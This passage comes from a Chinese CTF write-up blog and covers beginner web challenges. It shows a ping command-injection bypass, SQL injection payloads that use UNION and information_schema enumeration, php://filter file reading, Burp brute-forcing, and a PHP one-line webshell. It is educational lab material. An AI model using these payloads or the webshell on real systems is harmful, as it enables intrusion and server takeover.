class="regexp">/read=convert.base64-encode/</span>resource=pages<span class="regexp">/config</span></span><br></pre></td></tr></table></figure><p>得到base64解密得到flag</p><hr><h2 id="Homepage"><a href="#Homepage" class="headerlink" title="Homepage"></a>Homepage</h2><p>已解决，见第一题；</p><hr><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p> <img src="https://s2.ax1x.com/2019/12/30/lMTKEQ.png" alt="lMTKEQ.png"><br>源码给出，目的是对这个命令注入 ping -c 1 “{$ip}” 2&gt;&amp;1<br>黑名单未过滤反引号，尝试?ip=<code>ls</code>,得到：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMoqhR.png" alt="lMoqhR.png"><br>  Cat被过滤，可以尝试用tac倒着显示，flag也被过滤，使用通配符模糊匹配一下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">ip</span>=<span class="string">'tac f*'</span></span><br></pre></td></tr></table></figure><p>  得到flag。</p><hr><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h2><p>没啥思路，审查元素查找关键字flag，在响应头里发现flag<br><img src="https://s2.ax1x.com/2019/12/30/lMovjK.png" alt="lMovjK.png"></p><hr><h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h2><p>  Sql注入，提示利用guest登陆（guest，中文意思是客人，网络是指计算机的来宾账户。与“Administrator”和“User”不同的，通常这个帐户没有修改系统设置和进行安装程序的权限，也没有创建修改任何文档的权限，只能是读取计算机系统信息和文件。来宾帐户可提供若干与安全性和网络共享相关的特殊功能。）</p><h3 id="实际操作：-6"><a href="#实际操作：-6" class="headerlink" title="实际操作："></a>实际操作：</h3><ul><li>查看网页源码，可以看到直接返回了debug信息，含有完整的SQL语句：<br><img src="https://s2.ax1x.com/2019/12/30/lMoO91.png" alt="lMoO91.png"></li><li>查看给出的源码，发现过滤了’，将’转为/’，这里我们再添加一个转义符，把它添加的转义符转义了。</li><li>构造payload：<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span>=admin\’||1=1#;<span class="attribute">p</span><span class="attribute">a</span><span class="attribute">s</span><span class="attribute">s</span><span class="attribute">w</span><span class="attribute">o</span><span class="attribute">r</span><span class="attribute">d</span>=0</span><br></pre></td></tr></table></figure></li></ul><p>提示身份为guest，即第一个用户不是admin；</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造：user=admin\’||<span class="number">1</span>=<span class="number">1</span> limit <span class="number">1</span>,<span class="number">1</span>#；得到flag</span><br></pre></td></tr></table></figure><hr><h2 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h2><h3 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h3><p>此题和上题用的是同一个数据库，这次要在库里找flag2；</p><h3 id="实际操作：-7"><a href="#实际操作：-7" class="headerlink" title="实际操作："></a>实际操作：</h3><ul><li>确定列：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin\' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure></li></ul><p>正常回显了2，固有四列；</p><ul><li>表名<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User=admin \' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,concat(table_name),<span class="number">3</span>,<span class="number">4</span>  <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure></li></ul><p>得到表名：h1dden_f14g</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User=admin \' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span>  <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x68316464656e5f66313467</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>//这里有一点就是在逗号被过滤的情况下这里转义会导致sql查询出错，所以我们可以直接将表名进行ASCII的八进制编码，前面加上0x，就可以在sql中正常查询<br>返回the_f14g</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin \' union select <span class="number">1</span>,(select the_f14g from h1dden_f14g limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>  #</span><br></pre></td></tr></table></figure><p>得到flag。</p><hr><h2 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h2><p>查看源码，发现和 login as admin 0差不多，过滤了空格；用/**/ 代替空格</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin\'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br></pre></td></tr></table></figure><p>得到flag。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;hackme&quot;&gt;&lt;a href=&quot;#hackme&quot; class=&quot;headerlink&quot; title=&quot;hackme&quot;&gt;&lt;/a&gt;hackme&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;he
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="hackme" scheme="https://singlemindedt.github.io/categories/CTF/hackme/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
      <category term="Misc" scheme="https://singlemindedt.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web</title>
    <link href="https://singlemindedt.github.io/2019/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/"/>
    <id>https://singlemindedt.github.io/2019/12/25/攻防世界-Web/</id>
    <published>2019-12-25T14:49:02.000Z</published>
    <updated>2019-12-30T09:41:06.814Z</updated>
    
    <content type="html"><![CDATA[<center>目录</center>[TOC]<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h1 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h1><h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br>打开链接如下：</p><p><img src="http://wx1.sinaimg.cn/mw690/0070Pzw7gy1g6nlcr015bj30g7062dfx.jpg" alt="1"></p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>试试右键的确不管用了，直接F12，找到flag</p><p><img src="http://wx4.sinaimg.cn/mw690/0070Pzw7gy1g6nlc0awuuj30kc067wvy.jpg" alt="2"></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>另外还可以通过view-source：url查看源代码：</p><p><img src="http://wx3.sinaimg.cn/mw690/0070Pzw7gy1g6nlcvm0hgj30lq0cg3yt.jpg" alt="3"></p><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>其实还可以禁用Js代码，这样右键就可以用了：</p><p><img src="http://wx4.sinaimg.cn/mw690/0070Pzw7gy1g6nlczbhbwj30pn08b74w.jpg" alt="4"></p><hr><h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p><h2 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h2><h3 id="两种-HTTP-请求方法：GET-和-POST"><a href="#两种-HTTP-请求方法：GET-和-POST" class="headerlink" title="两种 HTTP 请求方法：GET 和 POST"></a>两种 HTTP 请求方法：GET 和 POST</h3><p>在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST。</span><br><span class="line">&#123;</span><br><span class="line">GET - 从指定的资源请求数据。</span><br><span class="line">POST - 向指定的资源提交要被处理的数据</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_httpmethods.asp</a> </p><p><a href="https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc</a></p><h2 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h2><p>打开网址，得到如下要求</p><p><img src="https://img-blog.csdnimg.cn/20190904152016124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>&lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;<br>在url后添加/？a=1即可发送get请求。</strong><br><img src="https://img-blog.csdnimg.cn/20190904152106943.png" alt="在这里插入图片描述"></p><p><strong>利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。</strong><br><img src="https://img-blog.csdnimg.cn/20190904152142555.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904152154319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>关于GET 和 POST：<a href="https://www.cnblogs.com/williamjie/p/9099940.html" target="_blank" rel="noopener">https://www.cnblogs.com/williamjie/p/9099940.html</a></strong></p><hr><h1 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p><h2 id="知识补充：-1"><a href="#知识补充：-1" class="headerlink" title="知识补充："></a>知识补充：</h2><p>  <strong>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</strong><br>  当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。<br>  如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p><p>  Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。<br>【<a href="https://blog.csdn.net/qq_40491569/article/details/83473703】" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83473703】</a></p><h2 id="实际操作：-1"><a href="#实际操作：-1" class="headerlink" title="实际操作："></a>实际操作：</h2><p>打开网页空白；</p><p><img src="https://img-blog.csdnimg.cn/20190904152608276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在题URL后输入/robots.txt即：  <a href="http://111.198.29.45:35567/robots.txt" target="_blank" rel="noopener">http://111.198.29.45:35567/robots.txt</a></p><p><img src="https://img-blog.csdnimg.cn/20190904152620940.png" alt="在这里插入图片描述"></p><p>f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag.</p><p><img src="https://img-blog.csdnimg.cn/2019090415264189.png" alt="在这里插入图片描述"></p><hr><h1 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h1><h2 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！<br><img src="https://img-blog.csdnimg.cn/20190904152903767.png" alt="在这里插入图片描述"></p><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>备份文件:    bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本）</strong></p><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>试着在index.php后加.bak<br>得到index.php.bak的备份文件，打开得到flag</p><hr><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="知识补充：-2"><a href="#知识补充：-2" class="headerlink" title="知识补充："></a>知识补充：</h2><p>  Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，<strong>Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。<br>其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行</strong>，也不能成为病毒，所以它对你基本无害。<br><strong>cookies的作用</strong>主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页;</p><p>  当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。</p><h2 id="实际操作：-2"><a href="#实际操作：-2" class="headerlink" title="实际操作："></a>实际操作：</h2><p>利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php”</p><p><img src="https://img-blog.csdnimg.cn/2019090415314763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904153157769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据提示信息，在URL后加上”/cookie.php”即<a href="http://111.198.29.45:47420/cookie.php" target="_blank" rel="noopener">http://111.198.29.45:47420/cookie.php</a></p><p><img src="https://img-blog.csdnimg.cn/20190904153416901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>提示查看HTTP响应，在消息头里发现flag。</p><p><img src="https://img-blog.csdnimg.cn/20190904153232157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><h2 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><h2 id="知识补充：-3"><a href="#知识补充：-3" class="headerlink" title="知识补充："></a>知识补充：</h2><p>需要熟悉一些常见的HTML知识</p><h2 id="实际操作：-3"><a href="#实际操作：-3" class="headerlink" title="实际操作："></a>实际操作：</h2><p>右键-&gt;查看元素，在input中用了‘disabled=” “’属性，双击，将其删掉，按钮便可正常使用。</p><p><img src="https://img-blog.csdnimg.cn/20190904153647682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904153656620.png" alt="在这里插入图片描述"></p><hr><h1 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h1><h2 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a>题目描述：</h2><p>  小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</p><h2 id="实际操作：-4"><a href="#实际操作：-4" class="headerlink" title="实际操作："></a>实际操作：</h2><p>打开链接空白，查看源码，有如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">dechiffre</span><span class="params">(pass_enc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line">    <span class="keyword">var</span> tab = pass_enc.split(<span class="string">','</span>);</span><br><span class="line">    <span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);</span><br><span class="line">    <span class="keyword">var</span> i, j, k, l = <span class="number">0</span>,</span><br><span class="line">        m, n, o, p = <span class="string">""</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = tab.length;</span><br><span class="line">    k = j + (l) + (n = <span class="number">0</span>);</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    <span class="keyword">for</span> (i = (o = <span class="number">0</span>); i &lt; (k = j = n); i++) &#123;</span><br><span class="line">        o = tab[i - l];</span><br><span class="line">        p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = (o = <span class="number">0</span>); i &lt; (k = j = n); i++) &#123;</span><br><span class="line">        o = tab[i - l];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">5</span> &amp;&amp; i &lt; k - <span class="number">1</span>)</span><br><span class="line">            p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    p += String.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">    pass = p;</span><br><span class="line">    <span class="keyword">return</span> pass;</span><br><span class="line">&#125;</span><br><span class="line">String[<span class="string">"fromCharCode"</span>](dechiffre(</span><br><span class="line">    <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">h = window.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">alert(dechiffre(h));</span><br></pre></td></tr></table></figure><p>这一长串16进制数很可疑，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br></pre></td></tr></table></figure><p>转字符得到：55,56,54,79,115,69,114,116,107,49,50<br>再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12<br>加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？）</p><hr><h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h1><h2 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师告诉小宁其实xff和referer是可以伪造的。</p><h2 id="实际操作：-5"><a href="#实际操作：-5" class="headerlink" title="实际操作："></a>实际操作：</h2><p>打开链接如图：<br><img src="https://s2.ax1x.com/2019/12/30/lMPavD.png" alt="lMPavD.png"></p><h2 id="知识补充-1"><a href="#知识补充-1" class="headerlink" title="知识补充"></a>知识补充</h2><h3 id="X-Forwarded-For和Referer"><a href="#X-Forwarded-For和Referer" class="headerlink" title="X-Forwarded-For和Referer"></a>X-Forwarded-For和Referer</h3><p><strong>XFF构造来源IP</strong><br><strong>Referer构造来源浏览器</strong><br>  X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>  HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理<br>利用bp抓包：<br><img src="https://s2.ax1x.com/2019/12/30/lMPwKe.png" alt="lMPwKe.png"></p><p>在HTTP头添加：X-Forwarded-For:123.123.123.123</p><p><img src="https://s2.ax1x.com/2019/12/30/lMP0DH.png" alt="lMP0DH.png"></p><p>得到下图提示：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPBbd.png" alt="lMPBbd.png"></p><p>再加一条Referer:<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 得到flag。</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPrVA.png" alt="lMPrVA.png"><br><a href="(/images/7.1.png)">1</a>:(/images/7.5.png)<br>由于每次添加都要重新输入，这里可以利用Repeater功能：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPsUI.png" alt="lMPsUI.png"></p><p>得到：<br><img src="https://s2.ax1x.com/2019/12/30/lMPy5t.png" alt="lMPy5t.png"></p><p>可以在左边直接编辑Request—&gt;右侧得到Response：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPg8f.png" alt="lMPg8f.png"></p><p>Response—&gt;Flag!</p><p><img src="https://s2.ax1x.com/2019/12/30/lMP228.png" alt="lMP228.png"></p><p>自己编辑的时候注意Target的格式：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPfKg.png" alt="lMPfKg.png"></p><p>去掉请求协议<strong>http://</strong></p><p><img src="https://s2.ax1x.com/2019/12/30/lMP4bj.png" alt="lMP4bj.png"></p><h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><strong>URL与URI：<a href="https://blog.csdn.net/lslk9898/article/details/86490383" target="_blank" rel="noopener">https://blog.csdn.net/lslk9898/article/details/86490383</a></strong></p><hr><h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><h2 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPugU.png" alt="lMPugU.png"></p><h2 id="实际操作-1"><a href="#实际操作-1" class="headerlink" title="实际操作"></a>实际操作</h2><p>根据弹窗的提示，用户名必须是admin</p><p>将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :)<br><img src="https://s2.ax1x.com/2019/12/30/lMPT5q.png" alt="lMPT5q.png"></p><hr><center>正常解法</center>用Burp Suite对它进行密码爆破，可以先试着输入username=admin和password=11111,以确定爆破位置。<p>Action—&gt;send to Intruder</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPHP0.png" alt="lMPHP0.png"></p><h3 id="基本配置："><a href="#基本配置：" class="headerlink" title="基本配置："></a>基本配置：</h3><p>1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：<strong>集束炸弹模式（Cluster bomb）</strong> 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。<br><img src="https://s2.ax1x.com/2019/12/30/lMPq2T.png" alt="lMPq2T.png"></p><p>2、由于username规定用admin；</p><p><strong>简单列表（Simple list）</strong> ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图<br><img src="https://s2.ax1x.com/2019/12/30/lMPXMF.png" alt="lMPXMF.png"></p><p>3、导入密码list</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPjr4.png" alt="lMPjr4.png"></p><p>4、可选项设置（Options）<br>可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。</p><h3 id="开始爆破："><a href="#开始爆破：" class="headerlink" title="开始爆破："></a>开始爆破：</h3><p><img src="https://s2.ax1x.com/2019/12/30/lMPn3T.png" alt="lMPn3T.png"></p><p>可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPQu4.png" alt="lMPQu4.png"></p><hr><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="题目描述：-8"><a href="#题目描述：-8" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。<br><img src="https://s2.ax1x.com/2019/12/30/lMPUgO.png" alt="lMPUgO.png"></p><h2 id="知识补充：-4"><a href="#知识补充：-4" class="headerlink" title="知识补充："></a>知识补充：</h2><p>  webshell就是以asp、php、jsp或者cgi等网页文件形式存在的<strong>一种命令执行环境</strong>，也可以将其称做为一种<strong>网页后门</strong>。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>  顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。<strong>webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限</strong>。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/80044676" target="_blank" rel="noopener">上传木马拿webshell的方法汇总</a></p><hr><p>图片给出的代码为php一句话木马：<strong><?php @eval($_POST['shell']);?></strong><br>一句话木马的工作原理：一句话木马分析服务端与客户端。</p><p>“一句话木马”服务端（是用于本地的html提交脚本木马文件）<br>  就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改<br>“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）<br>  用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p><ul><li>用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。</li></ul><p><img src="https://s2.ax1x.com/2019/12/30/lMPlDJ.png" alt="lMPlDJ.png"></p><p>连接成功：</p><p><img 